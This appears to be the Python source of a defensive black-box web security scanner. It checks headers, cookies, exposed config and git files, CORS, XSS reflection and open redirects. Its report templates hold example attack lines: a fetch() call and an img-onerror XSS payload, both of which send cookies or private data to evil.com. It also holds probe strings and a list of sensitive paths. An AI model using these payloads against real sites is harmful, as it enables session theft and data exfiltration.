"""Web Auditor — black-box security scanner for live websites.

Performs passive and semi-active analysis without brute force or destructive tests:
  1. HTTP security headers (CSP, HSTS, X-Frame-Options, etc.)
  2. Cookie security flags (HttpOnly, Secure, SameSite)
  3. Sensitive file exposure (.env, .git, backups, config files)
  4. Technology fingerprinting (server, frameworks, versions)
  5. JavaScript source analysis (inline + external scripts)
  6. CORS misconfiguration
  7. Information disclosure (server headers, error pages)
  8. Basic active probes (XSS reflection, open redirect, path traversal)
  9. TLS/HTTPS checks
"""

import re
import ssl
import time
import urllib.parse
from typing import Optional
from .base import BaseScanner, Category, Finding, ScanResult, Severity

try:
    import requests as _requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    _requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False


# ── Sensitive files to probe ───────────────────────────────────────────────

SENSITIVE_PATHS = [
    # Environment / config
    ("/.env",               Severity.CRITICAL, "Environment file with credentials"),
    ("/.env.local",         Severity.CRITICAL, "Local environment file"),
    ("/.env.production",    Severity.CRITICAL, "Production environment file"),
    ("/.env.backup",        Severity.CRITICAL, "Backup environment file"),
    ("/config.php",         Severity.HIGH,     "PHP configuration file"),
    ("/config.yml",         Severity.HIGH,     "YAML configuration file"),
    ("/config.json",        Severity.HIGH,     "JSON configuration file"),
    ("/settings.py",        Severity.HIGH,     "Python settings file"),
    ("/local_settings.py",  Severity.HIGH,     "Local Python settings"),
    ("/database.yml",       Severity.HIGH,     "Database configuration"),
    ("/application.properties", Severity.HIGH, "Java application properties"),
    # Git exposure
    ("/.git/config",        Severity.CRITICAL, "Git config (repo URL, remotes)"),
    ("/.git/HEAD",          Severity.HIGH,     "Git HEAD reference"),
    ("/.gitignore",         Severity.LOW,      "Git ignore file (reveals structure)"),
    # WordPress
    ("/wp-config.php",      Severity.CRITICAL, "WordPress config with DB credentials"),
    ("/wp-config.php.bak",  Severity.CRITICAL, "WordPress config backup"),
    ("/wp-login.php",       Severity.INFO,     "WordPress login page detected"),
    # Backups
    ("/backup.sql",         Severity.CRITICAL, "Database backup"),
    ("/dump.sql",           Severity.CRITICAL, "Database dump"),
    ("/db.sql",             Severity.CRITICAL, "Database SQL file"),
    ("/backup.zip",         Severity.HIGH,     "Application backup archive"),
    # Admin panels
    ("/admin",              Severity.MEDIUM,   "Admin panel (verify access control)"),
    ("/admin/",             Severity.MEDIUM,   "Admin panel directory"),
    ("/phpmyadmin",         Severity.HIGH,     "phpMyAdmin database admin"),
    ("/phpmyadmin/",        Severity.HIGH,     "phpMyAdmin database admin"),
    ("/_cpanel",            Severity.HIGH,     "cPanel admin interface"),
    # Debug / info
    ("/phpinfo.php",        Severity.HIGH,     "PHP info page (leaks version/config)"),
    ("/info.php",           Severity.HIGH,     "PHP info page"),
    ("/server-status",      Severity.MEDIUM,   "Apache server status"),
    ("/server-info",        Severity.MEDIUM,   "Apache server info"),
    # Package management
    ("/package.json",       Severity.LOW,      "npm package.json (dependency list)"),
    ("/composer.json",      Severity.LOW,      "Composer dependencies"),
    ("/requirements.txt",   Severity.LOW,      "Python requirements"),
    ("/Gemfile",            Severity.LOW,      "Ruby Gemfile"),
    # Other
    ("/robots.txt",         Severity.INFO,     "robots.txt (may reveal hidden paths)"),
    ("/sitemap.xml",        Severity.INFO,     "Sitemap (reveals URL structure)"),
    ("/.well-known/security.txt", Severity.INFO, "Security contact file"),
    ("/crossdomain.xml",    Severity.MEDIUM,   "Flash cross-domain policy"),
    ("/clientaccesspolicy.xml", Severity.MEDIUM, "Silverlight cross-domain policy"),
]

# ── XSS reflection test payloads ──────────────────────────────────────────

XSS_PROBE = "sG3curityGu4rd<script>alert(1)</script>"
XSS_INDICATORS = ["<script>alert(1)</script>", "sG3curityGu4rd<script>"]

OPEN_REDIRECT_PROBE = "//evil.example.com/redirect"
REDIRECT_INDICATORS = ["evil.example.com"]

# ── Technology fingerprint signatures ─────────────────────────────────────

TECH_FINGERPRINTS = {
    # Server headers
    "Apache":     [("Server", r"Apache")],
    "Nginx":      [("Server", r"nginx")],
    "IIS":        [("Server", r"IIS|Microsoft-IIS")],
    "Caddy":      [("Server", r"Caddy")],
    "Cloudflare": [("Server", r"cloudflare"), ("CF-Ray", r".")],
    # Framework headers
    "Django":     [("X-Frame-Options", r"."), ("Content-Type", r".")],
    "Laravel":    [("Set-Cookie", r"laravel_session")],
    "Rails":      [("X-Runtime", r"\d+\.\d+"), ("Set-Cookie", r"_session_id")],
    "Express.js": [("X-Powered-By", r"Express")],
    "ASP.NET":    [("X-Powered-By", r"ASP\.NET"), ("X-AspNet-Version", r".")],
    "PHP":        [("X-Powered-By", r"PHP")],
    "WordPress":  [("Link", r"wp-json")],
}

# ── Common redirect/filter params for open redirect testing ───────────────
REDIRECT_PARAMS = ["next", "redirect", "redirect_to", "return", "returnUrl", "url", "goto"]


class WebAuditor(BaseScanner):
    """Black-box web security scanner for live URLs."""

    name = "Web Auditor"

    def __init__(self, target_path: str, timeout: int = 10):
        super().__init__(target_path)
        self.base_url = target_path.rstrip("/")
        self.timeout = timeout
        self._session = None
        self._headers_cache: Optional[dict] = None
        self._response_cache: Optional[object] = None

    # ── Setup ──────────────────────────────────────────────────────────────

    def _get_session(self):
        if not REQUESTS_OK:
            raise RuntimeError("requests library not installed. Run: pip install requests")
        if self._session is None:
            import requests
            self._session = requests.Session()
            self._session.headers["User-Agent"] = (
                "SecurityGuard/2.0 (security-audit; contact security@example.com)"
            )
            self._session.verify = True  # Use TLS verification by default
        return self._session

    def _get(self, path: str = "", params: dict = None, allow_redirects: bool = True,
             verify_tls: bool = True) -> Optional[object]:
        import requests
        url = self.base_url + path if path.startswith("/") else path or self.base_url
        try:
            r = self._get_session().get(
                url, params=params, timeout=self.timeout,
                allow_redirects=allow_redirects, verify=verify_tls
            )
            return r
        except requests.exceptions.SSLError:
            return None
        except requests.exceptions.ConnectionError:
            return None
        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None

    def _head(self, path: str = "") -> Optional[object]:
        import requests
        url = self.base_url + path if path.startswith("/") else path or self.base_url
        try:
            return self._get_session().head(url, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    # ── Scan entry point ───────────────────────────────────────────────────

    def scan(self) -> ScanResult:
        if not REQUESTS_OK:
            result = ScanResult(scanner_name=self.name)
            result.findings.append(Finding(
                title="Web Auditor: Missing Dependency",
                severity=Severity.INFO,
                category=Category.SECURITY_MISCONFIG,
                file_path=self.base_url,
                line_number=None,
                code_snippet="pip install requests beautifulsoup4",
                description="The 'requests' library is required for web auditing.",
                recommendation="Run: pip install requests beautifulsoup4",
            ))
            return result

        start = time.time()
        result = ScanResult(scanner_name=self.name)

        # Fetch the homepage first (cache it)
        self._response_cache = self._get()
        if self._response_cache is None:
            result.findings.append(Finding(
                title="Target Unreachable",
                severity=Severity.CRITICAL,
                category=Category.SECURITY_MISCONFIG,
                file_path=self.base_url,
                line_number=None,
                code_snippet=self.base_url,
                description=f"Cannot connect to {self.base_url}. The host may be down or the URL incorrect.",
                recommendation="Verify the URL is correct and the server is running.",
                root_cause="Connection failed — host unreachable, wrong URL, or firewall blocking access.",
                consequences="Cannot complete security audit. Ensure the target is accessible.",
            ))
            result.scan_time_seconds = time.time() - start
            return result

        self._headers_cache = dict(self._response_cache.headers)
        result.files_scanned = 1

        # Run all checks
        self._check_https(result)
        self._check_security_headers(result)
        self._check_cookies(result)
        self._check_sensitive_files(result)
        self._check_cors(result)
        self._check_information_disclosure(result)
        self._check_fingerprints(result)
        self._check_js_sources(result)
        self._check_xss_reflection(result)
        self._check_open_redirect(result)
        self._check_robots(result)

        result.scan_time_seconds = time.time() - start
        return result

    # ── 1. HTTPS / TLS ────────────────────────────────────────────────────

    def _check_https(self, result: ScanResult):
        if self.base_url.startswith("http://"):
            result.findings.append(Finding(
                title="Site Served over HTTP (No TLS)",
                severity=Severity.HIGH,
                category=Category.SENSITIVE_DATA,
                file_path=self.base_url,
                line_number=None,
                code_snippet=self.base_url,
                description="The site is accessible over plain HTTP. All traffic is unencrypted and can be intercepted.",
                recommendation=(
                    "Enable HTTPS with a valid TLS certificate (Let's Encrypt is free). "
                    "Redirect all HTTP traffic to HTTPS. "
                    "Add HSTS header once HTTPS is stable."
                ),
                cwe_id="CWE-319",
                root_cause="TLS certificate not configured or HTTP not redirected to HTTPS.",
                consequences=(
                    "MAN-IN-THE-MIDDLE: Attacker on the same network intercepts all traffic.\n"
                    "CREDENTIAL THEFT: Login forms send passwords in plain text.\n"
                    "SESSION HIJACKING: Session cookies stolen from HTTP responses.\n"
                    "DATA TAMPERING: Attacker injects malicious content into pages."
                ),
                attack_simulation=(
                    "TOOL: mitmproxy -p 8080 --mode transparent\n"
                    "RESULT: All HTTP traffic readable and modifiable in real time."
                ),
            ))
            return

        # Check if HTTPS cert is valid (already handled by requests — if we got here, cert is OK)
        # Test if HTTP redirects to HTTPS
        if self.base_url.startswith("https://"):
            http_url = self.base_url.replace("https://", "http://", 1)
            r = self._get(http_url, allow_redirects=False)
            if r and r.status_code not in (301, 302, 307, 308):
                result.findings.append(Finding(
                    title="HTTP Not Redirected to HTTPS",
                    severity=Severity.MEDIUM,
                    category=Category.SENSITIVE_DATA,
                    file_path=http_url,
                    line_number=None,
                    code_snippet=f"HTTP {r.status_code} (no redirect)",
                    description="The site has HTTPS but does not redirect HTTP requests to it. Users accessing via http:// get an unencrypted connection.",
                    recommendation="Add a permanent redirect: HTTP 301 to https:// on all HTTP requests.",
                    cwe_id="CWE-319",
                    root_cause="Web server not configured with HTTP→HTTPS redirect rule.",
                    consequences="Users accidentally visiting via http:// are vulnerable to MiTM attacks.",
                ))

    # ── 2. Security Headers ────────────────────────────────────────────────

    def _check_security_headers(self, result: ScanResult):
        h = self._headers_cache or {}

        checks = [
            {
                "header": "Content-Security-Policy",
                "title": "Missing Content-Security-Policy (CSP) Header",
                "sev": Severity.HIGH,
                "desc": "No CSP header found. Without CSP, the browser has no policy restricting script sources, allowing XSS attacks to execute arbitrary code.",
                "rec": "Add a strict CSP: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'",
                "cwe": "CWE-1021",
                "root_cause": "Header not configured in web server or application framework.",
                "consequences": "XSS attacks can load scripts from any domain, enabling complete session takeover.",
            },
            {
                "header": "Strict-Transport-Security",
                "title": "Missing HTTP Strict Transport Security (HSTS)",
                "sev": Severity.MEDIUM,
                "desc": "No HSTS header. Browsers may still allow HTTP access, enabling SSL stripping attacks.",
                "rec": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                "cwe": "CWE-319",
                "root_cause": "HSTS not configured — site doesn't force browsers to always use HTTPS.",
                "consequences": "SSL stripping attacks downgrade HTTPS to HTTP transparently for the victim.",
            },
            {
                "header": "X-Frame-Options",
                "title": "Missing X-Frame-Options Header (Clickjacking Risk)",
                "sev": Severity.MEDIUM,
                "desc": "No X-Frame-Options or frame-ancestors CSP directive. The page can be embedded in iframes on other domains.",
                "rec": "Add: X-Frame-Options: DENY  or use CSP frame-ancestors 'none'",
                "cwe": "CWE-1021",
                "root_cause": "Clickjacking protection header missing from server configuration.",
                "consequences": "Attacker overlays a transparent iframe over legitimate page to trick users into clicking unintended actions.",
            },
            {
                "header": "X-Content-Type-Options",
                "title": "Missing X-Content-Type-Options Header",
                "sev": Severity.LOW,
                "desc": "No X-Content-Type-Options: nosniff header. Browsers may MIME-sniff responses, potentially executing non-JS as JavaScript.",
                "rec": "Add: X-Content-Type-Options: nosniff",
                "cwe": "CWE-16",
                "root_cause": "Header not set in web server default configuration.",
                "consequences": "MIME confusion attacks can execute uploaded files (images, PDFs) as scripts.",
            },
            {
                "header": "Referrer-Policy",
                "title": "Missing Referrer-Policy Header",
                "sev": Severity.LOW,
                "desc": "No Referrer-Policy header. Full URL (including paths and query params) may be sent to third-party domains.",
                "rec": "Add: Referrer-Policy: strict-origin-when-cross-origin",
                "cwe": "CWE-200",
                "root_cause": "Header not configured — browsers default to sending full referrer to third parties.",
                "consequences": "Sensitive URL parameters (session tokens, user IDs) leaked to external resources.",
            },
            {
                "header": "Permissions-Policy",
                "title": "Missing Permissions-Policy Header",
                "sev": Severity.LOW,
                "desc": "No Permissions-Policy header. Browser features (camera, microphone, geolocation) are not explicitly restricted.",
                "rec": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
                "cwe": "CWE-16",
                "root_cause": "New browser feature policy header not yet configured.",
                "consequences": "XSS attacks can request camera/microphone access without explicit permission policy blocking.",
            },
        ]

        for check in checks:
            header_name = check["header"]
            header_present = any(k.lower() == header_name.lower() for k in h)
            if not header_present:
                # For X-Frame-Options, also accept CSP frame-ancestors
                if header_name == "X-Frame-Options":
                    csp = h.get("Content-Security-Policy", "")
                    if "frame-ancestors" in csp.lower():
                        continue
                result.findings.append(Finding(
                    title=check["title"],
                    severity=check["sev"],
                    category=Category.SECURITY_MISCONFIG,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"{header_name}: (not present)",
                    description=check["desc"],
                    recommendation=check["rec"],
                    cwe_id=check["cwe"],
                    root_cause=check.get("root_cause"),
                    consequences=check.get("consequences"),
                ))

        # CSP present but has unsafe-inline or unsafe-eval
        csp = h.get("Content-Security-Policy", "")
        if csp:
            if "'unsafe-inline'" in csp and "script-src" in csp:
                result.findings.append(Finding(
                    title="CSP Allows 'unsafe-inline' Scripts",
                    severity=Severity.HIGH,
                    category=Category.SECURITY_MISCONFIG,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"Content-Security-Policy: {csp[:200]}",
                    description="CSP is present but allows 'unsafe-inline' scripts, completely defeating XSS protection.",
                    recommendation="Remove 'unsafe-inline'. Use nonces or hashes for inline scripts: script-src 'self' 'nonce-{random}'",
                    cwe_id="CWE-79",
                    root_cause="Developers added 'unsafe-inline' as a quick fix when legitimate inline scripts broke under CSP.",
                    consequences="XSS attacks bypass CSP entirely — same impact as no CSP.",
                ))
            if "'unsafe-eval'" in csp:
                result.findings.append(Finding(
                    title="CSP Allows 'unsafe-eval'",
                    severity=Severity.MEDIUM,
                    category=Category.SECURITY_MISCONFIG,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"Content-Security-Policy: {csp[:200]}",
                    description="CSP allows 'unsafe-eval', enabling eval()-based XSS attacks.",
                    recommendation="Remove 'unsafe-eval'. Refactor code to avoid eval(), Function(), setTimeout(string).",
                    cwe_id="CWE-79",
                    root_cause="Legacy code uses eval() or libraries that require it (some older template engines).",
                    consequences="Attackers can use eval()-based sinks to execute arbitrary JavaScript despite CSP.",
                ))

    # ── 3. Cookies ────────────────────────────────────────────────────────

    def _check_cookies(self, result: ScanResult):
        r = self._response_cache
        if not r:
            return

        for cookie in r.cookies:
            issues = []
            if not cookie.has_nonstandard_attr("HttpOnly") and not getattr(cookie, "_rest", {}).get("HttpOnly"):
                # requests parses HttpOnly into cookie._rest
                raw_header = self._headers_cache.get("Set-Cookie", "")
                if "httponly" not in raw_header.lower():
                    issues.append("Missing HttpOnly flag")

            if not cookie.secure:
                issues.append("Missing Secure flag")

            raw_sc = self._headers_cache.get("Set-Cookie", "")
            if "samesite" not in raw_sc.lower():
                issues.append("Missing SameSite attribute")

            if issues:
                result.findings.append(Finding(
                    title=f"Insecure Cookie: '{cookie.name}'",
                    severity=Severity.HIGH if "Secure" in " ".join(issues) or "HttpOnly" in " ".join(issues) else Severity.MEDIUM,
                    category=Category.BROKEN_AUTH,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"Set-Cookie: {cookie.name}=... ({'; '.join(issues)})",
                    description=f"Cookie '{cookie.name}' is missing security attributes: {', '.join(issues)}.",
                    recommendation=(
                        "Set all security flags: Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict\n"
                        "HttpOnly: prevents JavaScript access (XSS mitigation)\n"
                        "Secure: only sent over HTTPS\n"
                        "SameSite=Strict: prevents CSRF"
                    ),
                    cwe_id="CWE-1004",
                    root_cause="Cookie security attributes not configured in the application's session middleware.",
                    consequences=(
                        "MISSING HttpOnly: XSS can steal session via document.cookie.\n"
                        "MISSING Secure: Cookie sent over HTTP connections (MiTM theft).\n"
                        "MISSING SameSite: CSRF attacks can use the cookie cross-origin."
                    ),
                ))

    # ── 4. Sensitive file exposure ─────────────────────────────────────────

    def _check_sensitive_files(self, result: ScanResult):
        for path, severity, description in SENSITIVE_PATHS:
            r = self._get(path)
            if r is None:
                continue
            if r.status_code in (200, 206):
                # Confirm it's not a soft 404 (custom 404 pages returning 200)
                content = r.text[:500] if r.text else ""
                # Skip if response looks like a generic HTML error page
                if r.status_code == 200 and len(content) > 100:
                    if "<html" in content.lower() and any(
                        kw in content.lower() for kw in ["not found", "404", "error", "doesn't exist"]
                    ):
                        continue

                snippet = content[:200].replace("\n", " ").strip()

                # Extra severity escalation if file contains actual secrets
                actual_sev = severity
                if re.search(r"(?:password|secret|key|token|DATABASE_URL)\s*=\s*\S+", content, re.IGNORECASE):
                    actual_sev = Severity.CRITICAL

                result.findings.append(Finding(
                    title=f"Sensitive File Exposed: {path}",
                    severity=actual_sev,
                    category=Category.SENSITIVE_DATA,
                    file_path=f"{self.base_url}{path}",
                    line_number=None,
                    code_snippet=f"HTTP {r.status_code}: {snippet[:180]}",
                    description=(
                        f"{description}. The file is publicly accessible at {self.base_url}{path} "
                        f"(HTTP {r.status_code}). "
                        + ("CONTAINS CREDENTIALS — immediate action required." if actual_sev == Severity.CRITICAL else "")
                    ),
                    recommendation=(
                        f"Block access to {path} at the web server level:\n"
                        "  Nginx: location ~ /\\.env { deny all; }\n"
                        "  Apache: <FilesMatch \"\\.env\"> Require all denied </FilesMatch>\n"
                        "Move sensitive files outside the web root entirely."
                    ),
                    cwe_id="CWE-538",
                    root_cause="File placed in or accessible from the public web root without access restrictions.",
                    consequences=(
                        "CREDENTIAL THEFT: Database passwords, API keys, JWT secrets extracted directly.\n"
                        "FULL COMPROMISE: .git exposure allows reconstructing full source code.\n"
                        "SUPPLY CHAIN: Exposed package files reveal dependency versions for CVE targeting."
                    ),
                    attack_simulation=(
                        f"curl {self.base_url}{path}\n"
                        f"RESULT: HTTP 200 — file contents readable by anyone."
                    ),
                ))

    # ── 5. CORS ────────────────────────────────────────────────────────────

    def _check_cors(self, result: ScanResult):
        import requests as req
        # Send request with evil Origin header to test CORS policy
        try:
            r = self._get_session().get(
                self.base_url,
                headers={"Origin": "https://evil.example.com"},
                timeout=self.timeout,
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                result.findings.append(Finding(
                    title="CORS: Wildcard Origin (*)",
                    severity=Severity.HIGH,
                    category=Category.SECURITY_MISCONFIG,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"Access-Control-Allow-Origin: *",
                    description="Server allows cross-origin requests from any domain.",
                    recommendation="Restrict to specific trusted origins: Access-Control-Allow-Origin: https://yourdomain.com",
                    cwe_id="CWE-942",
                    root_cause="CORS set to * for development convenience and never restricted for production.",
                    consequences="Any website can read public API responses. Combined with credentials=true: full credential theft.",
                ))
            elif acao == "https://evil.example.com":
                # Server reflected our malicious origin — vulnerable CORS
                sev = Severity.CRITICAL if "true" in acac.lower() else Severity.HIGH
                result.findings.append(Finding(
                    title="CORS: Arbitrary Origin Reflection" + (" + Credentials" if "true" in acac.lower() else ""),
                    severity=sev,
                    category=Category.SECURITY_MISCONFIG,
                    file_path=self.base_url,
                    line_number=None,
                    code_snippet=f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                    description=(
                        "Server reflects any Origin header back as ACAO. "
                        + ("Combined with Allow-Credentials: true — CRITICAL. Any origin can read authenticated responses." if "true" in acac.lower() else "")
                    ),
                    recommendation=(
                        "Validate Origin against a whitelist before reflecting:\n"
                        "  ALLOWED = {'https://app.yourdomain.com'}\n"
                        "  if request.origin in ALLOWED: response['ACAO'] = request.origin"
                    ),
                    cwe_id="CWE-942",
                    root_cause="CORS policy uses a wildcard regex or blindly reflects the Origin header for convenience.",
                    consequences=(
                        "CRITICAL (with credentials): Any website can impersonate authenticated users.\n"
                        "Attacker's page reads private API data, performs actions as the logged-in user."
                    ),
                    attack_simulation=(
                        "fetch('https://target.com/api/profile', {credentials: 'include'})\n"
                        ".then(r => r.json())\n"
                        ".then(d => fetch('https://evil.com/?data=' + JSON.stringify(d)))\n"
                        "RESULT: Victim's private data sent to attacker on page visit."
                    ),
                ))
        except Exception:
            pass

    # ── 6. Information Disclosure ──────────────────────────────────────────

    def _check_information_disclosure(self, result: ScanResult):
        h = self._headers_cache or {}

        # Server header leaking version
        server = h.get("Server", "") or h.get("server", "")
        if server and re.search(r"\d+\.\d+", server):
            result.findings.append(Finding(
                title="Server Version Disclosed in Header",
                severity=Severity.LOW,
                category=Category.LOGGING,
                file_path=self.base_url,
                line_number=None,
                code_snippet=f"Server: {server}",
                description=f"The Server header reveals the exact version: '{server}'.",
                recommendation="Configure web server to suppress version: ServerTokens Prod (Apache) / server_tokens off (Nginx)",
                cwe_id="CWE-200",
                root_cause="Default web server configuration includes version in Server header.",
                consequences="Attacker targets known CVEs for the specific server version disclosed.",
            ))

        # X-Powered-By
        powered = h.get("X-Powered-By", "") or h.get("x-powered-by", "")
        if powered:
            result.findings.append(Finding(
                title="Technology Stack Disclosed (X-Powered-By)",
                severity=Severity.LOW,
                category=Category.LOGGING,
                file_path=self.base_url,
                line_number=None,
                code_snippet=f"X-Powered-By: {powered}",
                description=f"X-Powered-By header reveals technology: '{powered}'.",
                recommendation="Remove: header_remove X-Powered-By (Apache) / more_clear_headers 'X-Powered-By' (Nginx)",
                cwe_id="CWE-200",
                root_cause="Framework includes X-Powered-By header by default (Express, PHP, ASP.NET).",
                consequences="Narrows attacker's target list to known vulnerabilities for the disclosed technology.",
            ))

        # Test for error page info disclosure
        r = self._get("/__sg_test_nonexistent_path_404__")
        if r and r.status_code == 500:
            result.findings.append(Finding(
                title="Internal Server Error on Invalid Path",
                severity=Severity.MEDIUM,
                category=Category.LOGGING,
                file_path=f"{self.base_url}/__sg_test_nonexistent_path_404__",
                line_number=None,
                code_snippet=f"HTTP 500 on random path",
                description="Server returns HTTP 500 (Internal Server Error) on invalid paths — may expose stack traces.",
                recommendation="Return HTTP 404 for unknown paths. Add global error handler that returns generic messages.",
                cwe_id="CWE-209",
                root_cause="Missing global error handler — unhandled exceptions propagate to HTTP responses.",
                consequences="Stack traces reveal file paths, library versions, and DB schema details for targeted attacks.",
            ))

    # ── 7. Technology Fingerprinting ───────────────────────────────────────

    def _check_fingerprints(self, result: ScanResult):
        h = self._headers_cache or {}
        body = (self._response_cache.text or "") if self._response_cache else ""

        detected = []
        for tech, signatures in TECH_FINGERPRINTS.items():
            for (header, pattern) in signatures:
                val = h.get(header, "")
                if val and re.search(pattern, val, re.IGNORECASE):
                    detected.append(tech)
                    break

        # Check body for common CMS signatures
        if re.search(r"/wp-content/|wordpress", body, re.IGNORECASE):
            detected.append("WordPress")
        if re.search(r"Powered by Joomla|/components/com_", body, re.IGNORECASE):
            detected.append("Joomla")
        if re.search(r"Drupal|sites/default/files", body, re.IGNORECASE):
            detected.append("Drupal")
        if re.search(r"__VIEWSTATE|__EVENTVALIDATION", body):
            detected.append("ASP.NET WebForms")

        if detected:
            tech_list = ", ".join(sorted(set(detected)))
            result.findings.append(Finding(
                title=f"Technology Stack Identified: {tech_list}",
                severity=Severity.INFO,
                category=Category.LOGGING,
                file_path=self.base_url,
                line_number=None,
                code_snippet=f"Detected: {tech_list}",
                description=(
                    f"Technology fingerprinting identified: {tech_list}. "
                    "This information helps attackers target known CVEs for these technologies."
                ),
                recommendation="Minimize version disclosure. Keep all detected technologies up to date.",
                cwe_id="CWE-200",
                root_cause="Technology signatures present in HTTP headers or page HTML.",
                consequences="Narrows attacker's search space to known CVEs for identified technologies and versions.",
            ))

    # ── 8. JavaScript analysis ─────────────────────────────────────────────

    def _check_js_sources(self, result: ScanResult):
        import re as _re
        body = (self._response_cache.text or "") if self._response_cache else ""
        if not body:
            return

        # Find all script src attributes
        script_srcs = _re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, _re.IGNORECASE)
        inline_scripts = _re.findall(r'<script[^>]*>([\s\S]*?)</script>', body, _re.IGNORECASE)

        secrets_found = []

        # Secret patterns to check in JS
        SECRET_PATTERNS = [
            (r"""(?:api[_-]?key|apikey)\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]""", "API Key"),
            (r"""(?:secret|token|password)\s*[:=]\s*['"][^'"]{8,}['"]""", "Secret/Token"),
            (r"""AIza[0-9A-Za-z\-_]{35}""", "Google API Key"),
            (r"""sk-[a-zA-Z0-9]{48}""", "OpenAI API Key"),
            (r"""(?:AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[0-9A-Z]{16}""", "AWS Access Key"),
            (r"""eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+""", "JWT Token"),
        ]

        # Check inline scripts
        for script in inline_scripts:
            if len(script.strip()) < 10:
                continue
            for pattern, label in SECRET_PATTERNS:
                m = _re.search(pattern, script, _re.IGNORECASE)
                if m:
                    secrets_found.append((label, m.group(0)[:80], "inline script"))

        # Check external scripts (download and analyze)
        for src in script_srcs[:10]:  # limit to first 10 external scripts
            if src.startswith("//"):
                src = "https:" + src
            elif not src.startswith("http"):
                # Relative URL
                src = self.base_url.rstrip("/") + "/" + src.lstrip("/")

            r = self._get(src) if "http" in src else None
            if r and r.status_code == 200:
                result.files_scanned += 1
                js_content = r.text[:50000]  # limit to 50KB per file
                for pattern, label in SECRET_PATTERNS:
                    m = _re.search(pattern, js_content, _re.IGNORECASE)
                    if m:
                        # Skip if it looks like a placeholder
                        val = m.group(0)
                        if any(x in val.lower() for x in ["your_", "example", "placeholder", "xxxx", "test"]):
                            continue
                        secrets_found.append((label, val[:80], src.split("/")[-1]))

        for label, value, location in secrets_found:
            result.findings.append(Finding(
                title=f"Exposed Secret in JavaScript: {label}",
                severity=Severity.CRITICAL,
                category=Category.SECRETS,
                file_path=f"{self.base_url} ({location})",
                line_number=None,
                code_snippet=value,
                description=(
                    f"A {label} was found in publicly accessible JavaScript. "
                    "Any user visiting the site can extract this value from their browser's developer tools."
                ),
                recommendation=(
                    "Never embed API keys, tokens, or secrets in client-side JavaScript. "
                    "Use a backend proxy to make authenticated API calls server-side. "
                    "Rotate the exposed credential immediately."
                ),
                cwe_id="CWE-312",
                root_cause=(
                    "Secret embedded in frontend JavaScript for convenience (direct API calls from browser). "
                    "Developer didn't realize all JavaScript is visible to any user."
                ),
                consequences=(
                    "IMMEDIATE: Anyone can extract and use the credential from browser dev tools.\n"
                    "AUTOMATED: Bots scan public sites for credentials continuously.\n"
                    "ABUSE: Stolen API keys used to incur charges, exfiltrate data, or access services.\n"
                    "REAL WORLD: Firebase API keys, Stripe keys found in JS are actively exploited."
                ),
            ))

    # ── 9. XSS Reflection ─────────────────────────────────────────────────

    def _check_xss_reflection(self, result: ScanResult):
        # Try common query parameters with XSS probe
        test_params = ["q", "search", "query", "name", "id", "page", "s", "term"]
        for param in test_params[:5]:  # Limit probes
            r = self._get(params={param: XSS_PROBE})
            if r and r.status_code == 200:
                if any(ind in r.text for ind in XSS_INDICATORS):
                    result.findings.append(Finding(
                        title=f"Reflected XSS via '{param}' Parameter",
                        severity=Severity.HIGH,
                        category=Category.XSS,
                        file_path=f"{self.base_url}?{param}=...",
                        line_number=None,
                        code_snippet=f"GET {self.base_url}?{param}={XSS_PROBE[:60]}",
                        description=f"The '{param}' parameter reflects user input unescaped in the HTML response, enabling script injection.",
                        recommendation="HTML-encode all user input before rendering: use framework's built-in escaping (Jinja2 |e, Django auto-escape, React JSX).",
                        cwe_id="CWE-79",
                        root_cause="User input reflected in HTML response without encoding.",
                        consequences=(
                            "SESSION HIJACKING: Attacker sends crafted URL to victim, steals their cookie.\n"
                            "PHISHING: Inject fake login form into the legitimate page.\n"
                            "KEYLOGGING: Capture all user keystrokes via injected event listeners."
                        ),
                        attack_simulation=(
                            f"PAYLOAD URL: {self.base_url}?{param}=<img src=x onerror='fetch(\"https://evil.com/?c=\"+document.cookie)'>\n"
                            "RESULT: Victim's session cookie sent to attacker on click."
                        ),
                    ))
                    break  # One XSS finding is enough

    # ── 10. Open Redirect ─────────────────────────────────────────────────

    def _check_open_redirect(self, result: ScanResult):
        for param in REDIRECT_PARAMS:
            r = self._get(params={param: OPEN_REDIRECT_PROBE}, allow_redirects=False)
            if r and r.status_code in (301, 302, 307, 308):
                location = r.headers.get("Location", "")
                if any(ind in location for ind in REDIRECT_INDICATORS):
                    result.findings.append(Finding(
                        title=f"Open Redirect via '{param}' Parameter",
                        severity=Severity.MEDIUM,
                        category=Category.BROKEN_ACCESS,
                        file_path=f"{self.base_url}?{param}=...",
                        line_number=None,
                        code_snippet=f"GET ?{param}={OPEN_REDIRECT_PROBE} → Location: {location}",
                        description=f"The '{param}' parameter redirects to an external URL without validation.",
                        recommendation="Validate redirect URLs against an allowlist of trusted domains. Reject external URLs.",
                        cwe_id="CWE-601",
                        root_cause="Redirect target taken from URL parameter without domain validation.",
                        consequences=(
                            "PHISHING: Attacker sends link like yourdomain.com/login?next=evil.com\n"
                            "OAUTH THEFT: redirect_uri manipulation steals OAuth authorization codes.\n"
                            "TRUST: Victims trust the initial legitimate domain in the URL."
                        ),
                        attack_simulation=(
                            f"PHISHING URL: {self.base_url}?{param}=https://evil.com/fake-login\n"
                            "RESULT: Victim is redirected to attacker's page after clicking a 'legitimate' link."
                        ),
                    ))
                    break

